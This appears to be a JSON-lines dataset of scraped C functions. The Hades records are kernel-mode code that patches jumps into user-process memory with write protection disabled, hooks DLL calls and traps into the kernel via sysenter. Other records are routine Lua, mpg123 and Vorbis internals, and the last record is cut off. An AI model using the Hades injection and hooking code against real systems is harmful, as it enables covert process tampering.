{"docstring": "//-----------------------------------------------------------------------------\n// Pretty much says it all\n//-----------------------------------------------------------------------------\n", "func_signal": "void dump_memory_to_file(unsigned int src_addr, int len)", "code": "{\n\tunsigned int *memory = NULL;\n\tUNICODE_STRING  kdump;\n    NTSTATUS        ret; \n    HANDLE              Handle;\n    IO_STATUS_BLOCK     IoStatusBlock;\n    OBJECT_ATTRIBUTES   ObjectAttributes;\n\n\tRtlInitUnicodeString(&kdump, working_dir_dump);\n\n    InitializeObjectAttributes(&ObjectAttributes, &kdump,\n                               OBJ_CASE_INSENSITIVE|OBJ_KERNEL_HANDLE,\n                               NULL, NULL);\n\n\tret = ZwCreateFile(&Handle, GENERIC_WRITE, &ObjectAttributes, \n\t\t               &IoStatusBlock, NULL, 0, FILE_SHARE_WRITE, \n\t\t               FILE_OPEN_IF, \n\t\t\t\t\t   FILE_SYNCHRONOUS_IO_NONALERT|FILE_NON_DIRECTORY_FILE, \n\t\t\t\t\t   NULL, 0); \n\n\t// OK file created, now try and write to our file\n    if (STATUS_SUCCESS == ret)\n\t{\n\t\tmemory = (unsigned int *)src_addr;\n\n\t\tret = ZwWriteFile(Handle, NULL, NULL, NULL, &IoStatusBlock,\n\t\t\t              memory, len,  NULL, NULL);\n\n\t\tif (!NT_SUCCESS(ret)) \n\t\t\tDbgPrint( \"\\n!!! ERROR:ZwWriteFile Failed 0x%08X\\n\", ret);\n\n\t\tret = ZwClose(Handle);\n\t\tif (!NT_SUCCESS(ret)) \n\t\t\tDbgPrint( \"\\n!!! ERROR:ZwClose Failed 0x%08X\\n\", ret); \n\t}\n\telse\n\t\t DbgPrint(\"ZwCreateFile Failed 0x%08X\\n\", ret);\n\n}", "path": "support.c", "repo_name": "jnraber/Hades", "stars": 52, "license": "None", "language": "c", "size": 2420}
{"docstring": "//-----------------------------------------------------------------------------\n// Inject breakpoint into user space \n//-----------------------------------------------------------------------------\n", "func_signal": "int add_bp(void)", "code": "{\n\t// dest - currentAddr - sizeJump\n\tunsigned int jmp_mine = (unsigned int)&shared_mem - BP1 - SIZE_OF_JMP;\n\tunsigned int jmp_shared = shared_user_mem - BP1 - SIZE_OF_JMP;\n\n\t// steal memory to be patched later...this will be were the breakpoint \n\t// will be added - stolen_code is were stored\n\tRtlCopyMemory(stolen_code, breakpoint, SIZE_OF_JMP);\n\n\tif (jmp_mine > 0)\n\t{\n\t\tdebug(\"\\t\\t\\t adding bp to va 0x%X\\n\", BP1);\n\n\t\tjmp_op[0] = 0xE9;\n\t\tmemcpy(jmp_op + 1, &jmp_shared, SIZE_OF_JMP);\n\n\t\tdebug(\"\\t\\t\\t generated bp jump ins to shared mem: \");\n\t\tprint_memory(jmp_op, 5);\n\n\t\t// inject jmp into user space (reroute instruction pointer)\n\t\tCLEAR_WP_FLAG;\n\t\tRtlCopyMemory(breakpoint, jmp_op, SIZE_OF_JMP);\n\t\tRESTORE_CR0;\n\t}\n\n\t// copy shared memory function to shared user space memory\n\tCLEAR_WP_FLAG;\n\tRtlCopyMemory((PVOID)shared_kern_mem, shared_mem, SIZE_OF_SHARED_MEM);\n\tRESTORE_CR0;\n\n\treturn 0;\n}", "path": "debugger.c", "repo_name": "jnraber/Hades", "stars": 52, "license": "None", "language": "c", "size": 2420}
{"docstring": "//-----------------------------------------------------------------------------\n// Display contents of registers at a breakpoint      \n//\n// Print out the registers\n//                 \n//                STACK  (Low)\n//               -------\n//               | BP  | <- Breakpoint\n//               | EDI |\n//  gORIG_ESP -> | ESI |\n//               | EBP |\n//               | ESP |\n//               | EBX |\n//               | EDX |\n//               | ECX |\n//               | EAX | (High)\n//               -------\n//-----------------------------------------------------------------------------\n", "func_signal": "void save_context_dbg()", "code": "{\n\tunsigned int *local_sp = (unsigned int *)gORIG_ESP;\n\n\tDbgPrint(\"\\n\\t\\t !!! BREAKPOINT HIT @ %X!!!\\n\", gBP);\n\n\t// subtract first to point to EDI\n\tlocal_sp--; gEDI = *local_sp; g_EDI_ADDR = local_sp; \n\n\tlocal_sp++; gESI = *local_sp; g_ESI_ADDR = local_sp;\n\tlocal_sp++; gEBP = *local_sp; g_EBP_ADDR = local_sp;\n\tlocal_sp++; gESP = *local_sp; g_ESP_ADDR = local_sp;\n\tlocal_sp++; gEBX = *local_sp; g_EBX_ADDR = local_sp;\n\tlocal_sp++; gEDX = *local_sp; g_EDX_ADDR = local_sp;\n\tlocal_sp++; gECX = *local_sp; g_ECX_ADDR = local_sp;\n\tlocal_sp++; gEAX = *local_sp; g_EAX_ADDR = local_sp;\n\n\tDbgPrint(\"\\t\\t EAX = 0x%.8X, EBX = 0x%.8X, ECX = 0x%.8X, EDX = 0x%.8X \\n\", \n\t\t     gEAX, gEBX, gECX, gEDX);\n\tDbgPrint(\"\\t\\t ESI = 0x%.8X, EDI = 0x%.8X, ESP = 0x%.8X, EBP = 0x%.8X \\n\\n\", \n\t\t     gESI, gEDI, gESP, gEBP);\n}", "path": "debugger.c", "repo_name": "jnraber/Hades", "stars": 52, "license": "None", "language": "c", "size": 2420}
{"docstring": "//-----------------------------------------------------------------------------\n// Interrupt from user space allows us to gain control to now act as a debugger \n//-----------------------------------------------------------------------------\n", "func_signal": "void handle_bp(void)", "code": "{\n\tunsigned int endian = 0;\n\n\tdebug(\"\\t now handle the bp\\n\");\n\t\n\tsave_context_dbg();\n\n\t// replace stolen bytes\n\tif (breakpoint)\n\t{\n\t\tdebug(\"\\t replace stolen bytes\\n\");\n\t\tdebug(\"\\t before: \");\n\t\tprint_memory(breakpoint, 5);\n\n\t\tCLEAR_WP_FLAG;\n\t\tRtlCopyMemory(breakpoint, stolen_code, SIZE_OF_JMP);\n\t\tRESTORE_CR0;\n\n\t\tdebug(\"\\t after: \");\n\t\tprint_memory(breakpoint, 5);\n\t\n\t\t// how to change registers\n\t\t//modify_register(my_EAX, 1);\n\n\t\t// now jump back right from the kernel to the user space where the BP.\n\t\t// NOTE: \n\t\t// if you would like to change the EIP then instead of assigning the \n\t\t// EIP to the BP you can change it to were ever you would like the \n\t\t// instruction pointer to go\n\t\tdebug(\"\\t return control back to user space at loc 0x%X\\n\", BP1);\n\t\tgEIP = gBP;\n\t\treturn_to_user_app();\n\t}\n\telse\n\t\tDbgPrint(\"\\n!!! ERROR: breakpoint = NULL\\n\");\n}", "path": "debugger.c", "repo_name": "jnraber/Hades", "stars": 52, "license": "None", "language": "c", "size": 2420}
{"docstring": "//-----------------------------------------------------------------------------\n// This is the area of memory that will be shared with kernel and user process\n// Each ID code block is 0xC bytes in length\n//-----------------------------------------------------------------------------\n", "func_signal": "void __declspec(naked) _cdecl shared_mem_data_mining(void)", "code": "{  \n\t_asm {\n\t\tpushad             /* push all registers */\n\t\tpushfd             /* push flags */\n\t\tpush 0x409870      /* ID */\n\t\tjmp dword ptr MyHandler\n\t\tpushad             /* push all registers */\n\t\tpushfd             /* push flags */\n\t\tpush 0x4098B0      /* ID */\n\t\tjmp dword ptr MyHandler\nMyHandler:\n\t\tmov eax, 0x61      /* ZwLoadDriver identifier */\n\t\tmov edx, esp\n\t\t_emit 0x0F         /* sysenter */\n\t\t_emit 0x34\n\t}\n}", "path": "data_miner_hooks.c", "repo_name": "jnraber/Hades", "stars": 52, "license": "None", "language": "c", "size": 2420}
{"docstring": "//-----------------------------------------------------------------------------\n// D'oh \n//-----------------------------------------------------------------------------\n", "func_signal": "unsigned int endian_swap(unsigned int x)", "code": "{\n\tunsigned int ret;\n\n    ret = (x>>24) | \n        ((x<<8) & 0x00FF0000) |\n        ((x>>8) & 0x0000FF00) |\n        (x<<24);\n\n\treturn ret;\n}", "path": "support.c", "repo_name": "jnraber/Hades", "stars": 52, "license": "None", "language": "c", "size": 2420}
{"docstring": "//-----------------------------------------------------------------------------------------------------------------------------\n// DLL hooked\n//-----------------------------------------------------------------------------------------------------------------------------\n", "func_signal": "int  Mine__GetCommandLineA(void)", "code": "{\n\tDbgPrint(\" [[[ %X ]]] \\n \", gCallerRet);\n\t\n\tDbgPrint(\"_GetCommandLineA@0 (void)\\n\");\n\n\t restore_context_switch_OGA();\n\n\t _asm { \n\t add gID, 5\n\n\t // Restore the eflags\n\t push gDM_EFLAGS\n\t popfd\n\t _emit 0xA1\n\t _emit 0xF4\n\t _emit 0x35\n\t _emit 0x88\n\t _emit 0x7C\n\n\t jmp gID\n\t}\n}", "path": "HowToHookDLLCode.c", "repo_name": "jnraber/Hades", "stars": 52, "license": "None", "language": "c", "size": 2420}
{"docstring": "//-----------------------------------------------------------------------------\n// Restore the context and jumps back to the user process\n//-----------------------------------------------------------------------------\n", "func_signal": "void __declspec(naked) _cdecl restore_context_switch_dm()", "code": "{\n\t_asm\n\t{\n\t\t// when calling a \"naked\" function there is no \"Ret\"...even if there \n\t\t// was we don't want to do that since we are adjusting the stack to \n\t\t// how it was before the call from user space...So, pop the \n\t\t// return address (hooked_func_funcname defined below) then jmp to \n\t\t// it after :)\n\t\tpop ret_hooked_func\n\n\t\tmov eax, gDM_EAX\n\t\tmov ebx, gDM_EBX\n\t\tmov ecx, gDM_ECX\n\t\tmov edx, gDM_EDX\n\t\tmov esi, gDM_ESI\n\t\tmov edi, gDM_EDI\n\t\tmov ebp, gDM_EBP\n\n\t\tmov esp, gDM_ESP\n\n\t\tjmp ret_hooked_func\n\t}\n}", "path": "data_miner.c", "repo_name": "jnraber/Hades", "stars": 52, "license": "None", "language": "c", "size": 2420}
{"docstring": "//-----------------------------------------------------------------------------------------------------------------------------\n// Shared Memory\n//-----------------------------------------------------------------------------------------------------------------------------\n", "func_signal": "void __declspec(naked) _cdecl SharedMemory_DataMining_OGA(void)", "code": "{\n\t_asm {\n\n\t pushad\n\t pushfd\n\t push 0x401232  /* ID */\n\t jmp dword ptr MyHandler\n \t pushad\n\t pushfd\n\t push 0x7C812C8D  /* ID */\n\t jmp dword ptr MyHandler\nMyHandler:\n\t mov eax, 0x61   /* ZwLoadDriver identifier */\n\t mov edx, esp\n\t _emit 0x0F    /* sysenter */\n\t _emit 0x34\n\t }\n}", "path": "HowToHookDLLCode.c", "repo_name": "jnraber/Hades", "stars": 52, "license": "None", "language": "c", "size": 2420}
{"docstring": "/* }====================================================== */\n", "func_signal": "static void correctstack (lua_State *L, TValue *oldstack)", "code": "{\n  CallInfo *ci;\n  GCObject *up;\n  L->top = (L->top - oldstack) + L->stack;\n  for (up = L->openupval; up != NULL; up = up->gch.next)\n    gco2uv(up)->v = (gco2uv(up)->v - oldstack) + L->stack;\n  for (ci = L->base_ci; ci <= L->ci; ci++) {\n    ci->top = (ci->top - oldstack) + L->stack;\n    ci->base = (ci->base - oldstack) + L->stack;\n    ci->func = (ci->func - oldstack) + L->stack;\n  }\n  L->base = (L->base - oldstack) + L->stack;\n}", "path": "LUA\\lua\\ldo.c", "repo_name": "dergraf/PacketScript", "stars": 36, "license": "None", "language": "c", "size": 239}
{"docstring": "/*\n** Try to find a boundary in table `t'. A `boundary' is an integer index\n** such that t[i] is non-nil and t[i+1] is nil (and 0 if t[1] is nil).\n*/\n", "func_signal": "int luaH_getn (Table *t)", "code": "{\n  unsigned int j = t->sizearray;\n  if (j > 0 && ttisnil(&t->array[j - 1])) {\n    /* there is a boundary in the array part: (binary) search for it */\n    unsigned int i = 0;\n    while (j - i > 1) {\n      unsigned int m = (i+j)/2;\n      if (ttisnil(&t->array[m - 1])) j = m;\n      else i = m;\n    }\n    return i;\n  }\n  /* else must find a boundary in hash part */\n  else if (t->node == dummynode)  /* hash part is empty? */\n    return j;  /* that is easy... */\n  else return unbound_search(t, j);\n}", "path": "LUA\\lua\\ltable.c", "repo_name": "dergraf/PacketScript", "stars": 36, "license": "None", "language": "c", "size": 239}
{"docstring": "/*\n** load precompiled chunk\n*/\n", "func_signal": "Proto* luaU_undump (lua_State* L, ZIO* Z, Mbuffer* buff, const char* name)", "code": "{\n LoadState S;\n if (*name=='@' || *name=='=')\n  S.name=name+1;\n else if (*name==LUA_SIGNATURE[0])\n  S.name=\"binary string\";\n else\n  S.name=name;\n S.L=L;\n S.Z=Z;\n S.b=buff;\n LoadHeader(&S);\n return LoadFunction(&S,luaS_newliteral(L,\"=?\"));\n}", "path": "LUA\\lua\\lundump.c", "repo_name": "dergraf/PacketScript", "stars": 36, "license": "None", "language": "c", "size": 239}
{"docstring": "/*\n** inserts a new key into a hash table; first, check whether key's main \n** position is free. If not, check whether colliding node is in its main \n** position or not: if it is not, move colliding node to an empty place and \n** put new key in its main position; otherwise (colliding node is in its main \n** position), new key goes to an empty position. \n*/\n", "func_signal": "static TValue *newkey (lua_State *L, Table *t, const TValue *key)", "code": "{\n  Node *mp = mainposition(t, key);\n  if (!ttisnil(gval(mp)) || mp == dummynode) {\n    Node *othern;\n    Node *n = getfreepos(t);  /* get a free place */\n    if (n == NULL) {  /* cannot find a free place? */\n      rehash(L, t, key);  /* grow table */\n      return luaH_set(L, t, key);  /* re-insert key into grown table */\n    }\n    lua_assert(n != dummynode);\n    othern = mainposition(t, key2tval(mp));\n    if (othern != mp) {  /* is colliding node out of its main position? */\n      /* yes; move colliding node into free position */\n      while (gnext(othern) != mp) othern = gnext(othern);  /* find previous */\n      gnext(othern) = n;  /* redo the chain with `n' in place of `mp' */\n      *n = *mp;  /* copy colliding node into free pos. (mp->next also goes) */\n      gnext(mp) = NULL;  /* now `mp' is free */\n      setnilvalue(gval(mp));\n    }\n    else {  /* colliding node is in its own main position */\n      /* new node will go into free position */\n      gnext(n) = gnext(mp);  /* chain new position */\n      gnext(mp) = n;\n      mp = n;\n    }\n  }\n  gkey(mp)->value = key->value; gkey(mp)->tt = key->tt;\n  luaC_barriert(L, t, key);\n  lua_assert(ttisnil(gval(mp)));\n  return gval(mp);\n}", "path": "LUA\\lua\\ltable.c", "repo_name": "dergraf/PacketScript", "stars": 36, "license": "None", "language": "c", "size": 239}
{"docstring": "/*\n** check whether list has any jump that do not produce a value\n** (or produce an inverted value)\n*/\n", "func_signal": "static int need_value (FuncState *fs, int list)", "code": "{\n  for (; list != NO_JUMP; list = getjump(fs, list)) {\n    Instruction i = *getjumpcontrol(fs, list);\n    if (GET_OPCODE(i) != OP_TESTSET) return 1;\n  }\n  return 0;  /* not found */\n}", "path": "LUA\\lua\\lcode.c", "repo_name": "dergraf/PacketScript", "stars": 36, "license": "None", "language": "c", "size": 239}
{"docstring": "/*\n** Reader for generic `load' function: `lua_load' uses the\n** stack for internal stuff, so the reader cannot change the\n** stack top. Instead, it keeps its resulting string in a\n** reserved slot inside the stack.\n*/\n", "func_signal": "static const char *generic_reader (lua_State *L, void *ud, size_t *size)", "code": "{\n  (void)ud;  /* to avoid warnings */\n  luaL_checkstack(L, 2, \"too many nested functions\");\n  lua_pushvalue(L, 1);  /* get function */\n  lua_call(L, 0, 1);  /* call it */\n  if (lua_isnil(L, -1)) {\n    *size = 0;\n    return NULL;\n  }\n  else if (lua_isstring(L, -1)) {\n    lua_replace(L, 3);  /* save string in a reserved stack slot */\n    return lua_tolstring(L, 3, size);\n  }\n  else luaL_error(L, \"reader function must return a string\");\n  return NULL;  /* to avoid warnings */\n}", "path": "LUA\\lua\\lbaselib.c", "repo_name": "dergraf/PacketScript", "stars": 36, "license": "None", "language": "c", "size": 239}
{"docstring": "/* converts back */\n", "func_signal": "int luaO_fb2int (int x)", "code": "{\n  int e = (x >> 3) & 31;\n  if (e == 0) return x;\n  else return ((x & 7)+8) << (e - 1);\n}", "path": "LUA\\lua\\lobject.c", "repo_name": "dergraf/PacketScript", "stars": 36, "license": "None", "language": "c", "size": 239}
{"docstring": "/*\nstatic int luaB_dofile (lua_State *L) {\n  const char *fname = luaL_optstring(L, 1, NULL);\n  int n = lua_gettop(L);\n  if (luaL_loadfile(L, fname) != 0) lua_error(L);\n  lua_call(L, 0, LUA_MULTRET);\n  return lua_gettop(L) - n;\n}\n*/\n", "func_signal": "static int luaB_assert (lua_State *L)", "code": "{\n  luaL_checkany(L, 1);\n  if (!lua_toboolean(L, 1))\n    return luaL_error(L, \"%s\", luaL_optstring(L, 2, \"assertion failed!\"));\n  return lua_gettop(L);\n}", "path": "LUA\\lua\\lbaselib.c", "repo_name": "dergraf/PacketScript", "stars": 36, "license": "None", "language": "c", "size": 239}
{"docstring": "/*\n** returns the index of a `key' for table traversals. First goes all\n** elements in the array part, then elements in the hash part. The\n** beginning of a traversal is signalled by -1.\n*/\n", "func_signal": "static int findindex (lua_State *L, Table *t, StkId key)", "code": "{\n  int i;\n  if (ttisnil(key)) return -1;  /* first iteration */\n  i = arrayindex(key);\n  if (0 < i && i <= t->sizearray)  /* is `key' inside array part? */\n    return i-1;  /* yes; that's the index (corrected to C) */\n  else {\n    Node *n = mainposition(t, key);\n    do {  /* check whether `key' is somewhere in the chain */\n      /* key may be dead already, but it is ok to use it in `next' */\n      if (luaO_rawequalObj(key2tval(n), key) ||\n            (ttype(gkey(n)) == LUA_TDEADKEY && iscollectable(key) &&\n             gcvalue(gkey(n)) == gcvalue(key))) {\n        i = cast_int(n - gnode(t, 0));  /* key index in hash table */\n        /* hash elements are numbered after array ones */\n        return i + t->sizearray;\n      }\n      else n = gnext(n);\n    } while (n);\n    luaG_runerror(L, \"invalid key to \" LUA_QL(\"next\"));  /* key not found */\n    return 0;  /* to avoid warnings */\n  }\n}", "path": "LUA\\lua\\ltable.c", "repo_name": "dergraf/PacketScript", "stars": 36, "license": "None", "language": "c", "size": 239}
{"docstring": "/*\n** Call a function (C or Lua). The function to be called is at *func.\n** The arguments are on the stack, right after the function.\n** When returns, all the results are on the stack, starting at the original\n** function position.\n*/\n", "func_signal": "void luaD_call (lua_State *L, StkId func, int nResults)", "code": "{\n  if (++L->nCcalls >= LUAI_MAXCCALLS) {\n    if (L->nCcalls == LUAI_MAXCCALLS)\n      luaG_runerror(L, \"C stack overflow\");\n    else if (L->nCcalls >= (LUAI_MAXCCALLS + (LUAI_MAXCCALLS>>3)))\n      luaD_throw(L, LUA_ERRERR);  /* error while handing stack error */\n  }\n  if (luaD_precall(L, func, nResults) == PCRLUA)  /* is a Lua function? */\n    luaV_execute(L, 1);  /* call it */\n  L->nCcalls--;\n  luaC_checkGC(L);\n}", "path": "LUA\\lua\\ldo.c", "repo_name": "dergraf/PacketScript", "stars": 36, "license": "None", "language": "c", "size": 239}
{"docstring": "/*\n** returns current `pc' and marks it as a jump target (to avoid wrong\n** optimizations with consecutive instructions not in the same basic block).\n*/\n", "func_signal": "int luaK_getlabel (FuncState *fs)", "code": "{\n  fs->lasttarget = fs->pc;\n  return fs->pc;\n}", "path": "LUA\\lua\\lcode.c", "repo_name": "dergraf/PacketScript", "stars": 36, "license": "None", "language": "c", "size": 239}
{"docstring": "/* }====================================================== */\n", "func_signal": "static void auxopen (lua_State *L, const char *name,\n                     lua_CFunction f, lua_CFunction u)", "code": "{\n  lua_pushcfunction(L, u);\n  lua_pushcclosure(L, f, 1);\n  lua_setfield(L, -2, name);\n}", "path": "LUA\\lua\\lbaselib.c", "repo_name": "dergraf/PacketScript", "stars": 36, "license": "None", "language": "c", "size": 239}
{"docstring": "/*\n** main search function\n*/\n", "func_signal": "const TValue *luaH_get (Table *t, const TValue *key)", "code": "{\n  switch (ttype(key)) {\n    case LUA_TNIL: return luaO_nilobject;\n    case LUA_TSTRING: return luaH_getstr(t, rawtsvalue(key));\n    case LUA_TNUMBER: {\n      int k;\n      lua_Number n = nvalue(key);\n      lua_number2int(k, n);\n      if (luai_numeq(cast_num(k), nvalue(key))) /* index is int? */\n        return luaH_getnum(t, k);  /* use specialized version */\n      /* else go through */\n    }\n    default: {\n      Node *n = mainposition(t, key);\n      do {  /* check whether `key' is somewhere in the chain */\n        if (luaO_rawequalObj(key2tval(n), key))\n          return gval(n);  /* that's it */\n        else n = gnext(n);\n      } while (n);\n      return luaO_nilobject;\n    }\n  }\n}", "path": "LUA\\lua\\ltable.c", "repo_name": "dergraf/PacketScript", "stars": 36, "license": "None", "language": "c", "size": 239}
{"docstring": "/*\n** If your system does not support `stdout', you can just remove this function.\n** If you need, you can define your own `print' function, following this\n** model but changing `fputs' to put the strings at a proper place\n** (a console window or a log file, for instance).\n*/\n", "func_signal": "static int luaB_print (lua_State *L)", "code": "{\n  int n = lua_gettop(L);  /* number of arguments */\n  int i;\n  lua_getglobal(L, \"tostring\");\n  for (i=1; i<=n; i++) {\n    const char *s;\n    lua_pushvalue(L, -1);  /* function to be called */\n    lua_pushvalue(L, i);   /* value to print */\n    lua_call(L, 1, 1);\n    s = lua_tostring(L, -1);  /* get result */\n    if (s == NULL)\n      return luaL_error(L, LUA_QL(\"tostring\") \" must return a string to \"\n                           LUA_QL(\"print\"));\n    printk(KERN_INFO \"LUA[print]: %s\", s);\n    lua_pop(L, 1);  /* pop result */\n  }\n  return 0;\n}", "path": "LUA\\lua\\lbaselib.c", "repo_name": "dergraf/PacketScript", "stars": 36, "license": "None", "language": "c", "size": 239}
{"docstring": "/*\n** hash for lua_Numbers\n*/\n", "func_signal": "static Node *hashnum (const Table *t, lua_Number n)", "code": "{\n  unsigned int a[numints];\n  int i;\n  if (luai_numeq(n, 0))  /* avoid problems with -0 */\n    return gnode(t, 0);\n  memcpy(a, &n, sizeof(a));\n  for (i = 1; i < numints; i++) a[0] += a[i];\n  return hashmod(t, a[0]);\n}", "path": "LUA\\lua\\ltable.c", "repo_name": "dergraf/PacketScript", "stars": 36, "license": "None", "language": "c", "size": 239}
{"docstring": "/*\n** search function for integers\n*/\n", "func_signal": "const TValue *luaH_getnum (Table *t, int key)", "code": "{\n  /* (1 <= key && key <= t->sizearray) */\n  if (cast(unsigned int, key-1) < cast(unsigned int, t->sizearray))\n    return &t->array[key-1];\n  else {\n    lua_Number nk = cast_num(key);\n    Node *n = hashnum(t, nk);\n    do {  /* check whether `key' is somewhere in the chain */\n      if (ttisnumber(gkey(n)) && luai_numeq(nvalue(gkey(n)), nk))\n        return gval(n);  /* that's it */\n      else n = gnext(n);\n    } while (n);\n    return luaO_nilobject;\n  }\n}", "path": "LUA\\lua\\ltable.c", "repo_name": "dergraf/PacketScript", "stars": 36, "license": "None", "language": "c", "size": 239}
{"docstring": "/*\n* make header\n*/\n", "func_signal": "void luaU_header (char* h)", "code": "{\n int x=1;\n memcpy(h,LUA_SIGNATURE,sizeof(LUA_SIGNATURE)-1);\n h+=sizeof(LUA_SIGNATURE)-1;\n *h++=(char)LUAC_VERSION;\n *h++=(char)LUAC_FORMAT;\n *h++=(char)*(char*)&x;\t\t\t\t/* endianness */\n *h++=(char)sizeof(int);\n *h++=(char)sizeof(size_t);\n *h++=(char)sizeof(Instruction);\n *h++=(char)sizeof(lua_Number);\n *h++=(char)(((lua_Number)0.5)==0);\t\t/* is lua_Number integral? */\n}", "path": "LUA\\lua\\lundump.c", "repo_name": "dergraf/PacketScript", "stars": 36, "license": "None", "language": "c", "size": 239}
{"docstring": "/*\n** Look for n-th local variable at line `line' in function `func'.\n** Returns NULL if not found.\n*/\n", "func_signal": "const char *luaF_getlocalname (const Proto *f, int local_number, int pc)", "code": "{\n  int i;\n  for (i = 0; i<f->sizelocvars && f->locvars[i].startpc <= pc; i++) {\n    if (pc < f->locvars[i].endpc) {  /* is variable active? */\n      local_number--;\n      if (local_number == 0)\n        return getstr(f->locvars[i].varname);\n    }\n  }\n  return NULL;  /* not found */\n}", "path": "LUA\\lua\\lfunc.c", "repo_name": "dergraf/PacketScript", "stars": 36, "license": "None", "language": "c", "size": 239}
{"docstring": "/* LUA_NUMBER */\n", "func_signal": "static void read_numeral (LexState *ls, SemInfo *seminfo)", "code": "{\n  lua_assert(isdigit(ls->current));\n  do {\n    save_and_next(ls);\n  } while (isdigit(ls->current) || ls->current == '.');\n  if (check_next(ls, \"Ee\"))  /* `E'? */\n    check_next(ls, \"+-\");  /* optional exponent sign */\n  while (isalnum(ls->current) || ls->current == '_')\n    save_and_next(ls);\n  save(ls, '\\0');\n  buffreplace(ls, '.', ls->decpoint);  /* follow locale for decimal point */\n  if (!luaO_str2d(luaZ_buffer(ls->buff), &seminfo->r))  /* format error? */\n    trydecpoint(ls, seminfo); /* try to update decimal point separator */\n}", "path": "LUA\\lua\\llex.c", "repo_name": "dergraf/PacketScript", "stars": 36, "license": "None", "language": "c", "size": 239}
{"docstring": "/*\n** }=============================================================\n*/\n", "func_signal": "Table *luaH_new (lua_State *L, int narray, int nhash)", "code": "{\n  Table *t = luaM_new(L, Table);\n  luaC_link(L, obj2gco(t), LUA_TTABLE);\n  t->metatable = NULL;\n  t->flags = cast_byte(~0);\n  /* temporary values (kept only if some malloc fails) */\n  t->array = NULL;\n  t->sizearray = 0;\n  t->lsizenode = 0;\n  t->node = cast(Node *, dummynode);\n  setarrayvector(L, t, narray);\n  setnodevector(L, t, nhash);\n  return t;\n}", "path": "LUA\\lua\\ltable.c", "repo_name": "dergraf/PacketScript", "stars": 36, "license": "None", "language": "c", "size": 239}
{"docstring": "/********************************/\n", "func_signal": "DOUBLE compute_bpf(mpg123_handle *fr)", "code": "{\n\tDOUBLE bpf;\n\n\tswitch(fr->lay) \n\t{\n\t\tcase 1:\n\t\t\tbpf = tabsel_123[fr->lsf][0][fr->bitrate_index];\n\t\t\tbpf *= 12000.0 * 4.0;\n\t\t\tbpf /= freqs[fr->sampling_frequency] <<(fr->lsf);\n\t\tbreak;\n\t\tcase 2:\n\t\tcase 3:\n\t\t\tbpf = tabsel_123[fr->lsf][fr->lay-1][fr->bitrate_index];\n\t\t\tbpf *= 144000;\n\t\t\tbpf /= freqs[fr->sampling_frequency] << (fr->lsf);\n\t\tbreak;\n\t\tdefault:\n\t\t\tbpf = 1.0;\n\t}\n\n\treturn bpf;\n}", "path": "libraries-src\\ps3soundlib\\libs\\libmpg123\\parse.c", "repo_name": "Estwald/PSDK3v2", "stars": 44, "license": "None", "language": "c", "size": 333582}
{"docstring": "/* Header packing/unpacking ********************************************/\n", "func_signal": "static int _vorbis_unpack_info(vorbis_info *vi,oggpack_buffer *opb)", "code": "{\n  codec_setup_info     *ci=vi->codec_setup;\n  if(!ci)return(OV_EFAULT);\n\n  vi->version=oggpack_read(opb,32);\n  if(vi->version!=0)return(OV_EVERSION);\n\n  vi->channels=oggpack_read(opb,8);\n  vi->rate=oggpack_read(opb,32);\n\n  vi->bitrate_upper=oggpack_read(opb,32);\n  vi->bitrate_nominal=oggpack_read(opb,32);\n  vi->bitrate_lower=oggpack_read(opb,32);\n\n  ci->blocksizes[0]=1<<oggpack_read(opb,4);\n  ci->blocksizes[1]=1<<oggpack_read(opb,4);\n\n  if(vi->rate<1)goto err_out;\n  if(vi->channels<1)goto err_out;\n  if(ci->blocksizes[0]<64)goto err_out;\n  if(ci->blocksizes[1]<ci->blocksizes[0])goto err_out;\n  if(ci->blocksizes[1]>8192)goto err_out;\n\n  if(oggpack_read(opb,1)!=1)goto err_out; /* EOP check */\n\n  return(0);\n err_out:\n  vorbis_info_clear(vi);\n  return(OV_EBADHEADER);\n}", "path": "libraries-src\\ps3soundlib\\libs\\libogg-1.2.1\\info.c", "repo_name": "Estwald/PSDK3v2", "stars": 44, "license": "None", "language": "c", "size": 333582}
{"docstring": "/*\n * decode a header and write the information\n * into the frame structure\n */\n", "func_signal": "static int decode_header(mpg123_handle *fr,unsigned long newhead)", "code": "{\n\tif(!head_check(newhead))\n\t{\n\t\tif(NOQUIET) error(\"tried to decode obviously invalid header\");\n\n\t\treturn 0;\n\t}\n\tif( newhead & (1<<20) )\n\t{\n\t\tfr->lsf = (newhead & (1<<19)) ? 0x0 : 0x1;\n\t\tfr->mpeg25 = 0;\n\t}\n\telse\n\t{\n\t\tfr->lsf = 1;\n\t\tfr->mpeg25 = 1;\n\t}\n\n\tif(   (fr->p.flags & MPG123_NO_RESYNC) || !fr->oldhead\n\t   || (((fr->oldhead>>19)&0x3) ^ ((newhead>>19)&0x3))  )\n\t{\n\t\t/* If \"tryresync\" is false, assume that certain\n\t\tparameters do not change within the stream!\n\t\tForce an update if lsf or mpeg25 settings\n\t\thave changed. */\n\t\tfr->lay = 4-((newhead>>17)&3);\n\t\tif( ((newhead>>10)&0x3) == 0x3)\n\t\t{\n\t\t\tif(NOQUIET) error(\"Stream error\");\n\n\t\t\treturn 0; /* exit() here really is too much, isn't it? */\n\t\t}\n\t\tif(fr->mpeg25)\n\t\tfr->sampling_frequency = 6 + ((newhead>>10)&0x3);\n\t\telse\n\t\tfr->sampling_frequency = ((newhead>>10)&0x3) + (fr->lsf*3);\n\t}\n\n\t#ifdef DEBUG\n\tif((((newhead>>16)&0x1)^0x1) != fr->error_protection) debug(\"changed crc bit!\");\n\t#endif\n\tfr->error_protection = ((newhead>>16)&0x1)^0x1; /* seen a file where this varies (old lame tag without crc, track with crc) */\n\tfr->bitrate_index = ((newhead>>12)&0xf);\n\tfr->padding   = ((newhead>>9)&0x1);\n\tfr->extension = ((newhead>>8)&0x1);\n\tfr->mode      = ((newhead>>6)&0x3);\n\tfr->mode_ext  = ((newhead>>4)&0x3);\n\tfr->copyright = ((newhead>>3)&0x1);\n\tfr->original  = ((newhead>>2)&0x1);\n\tfr->emphasis  = newhead & 0x3;\n\n\tfr->stereo    = (fr->mode == MPG_MD_MONO) ? 1 : 2;\n\n\tfr->oldhead = newhead;\n\n\tif(!fr->bitrate_index)\n\t{\n\t\tif(NOQUIET) error1(\"encountered free format header %08lx in decode_header - not supported yet\",newhead);\n\n\t\treturn 0;\n\t}\n\n\tswitch(fr->lay)\n\t{\n\t\tcase 1:\n\t\t\tfr->do_layer = do_layer1;\n\t\t\tfr->framesize  = (long) tabsel_123[fr->lsf][0][fr->bitrate_index] * 12000;\n\t\t\tfr->framesize /= freqs[fr->sampling_frequency];\n\t\t\tfr->framesize  = ((fr->framesize+fr->padding)<<2)-4;\n\t\tbreak;\n\t\tcase 